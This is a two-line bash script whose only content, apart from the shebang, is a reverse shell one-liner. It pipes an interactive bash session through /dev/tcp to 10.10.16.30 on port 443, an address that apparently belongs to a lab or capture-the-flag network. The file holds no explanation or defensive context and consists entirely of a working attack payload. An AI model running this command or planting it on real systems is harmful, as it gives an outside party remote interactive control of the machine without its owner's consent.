#!/usr/bin/env bash

/bin/bash -i >& /dev/tcp/10.10.16.30/443 0>&1
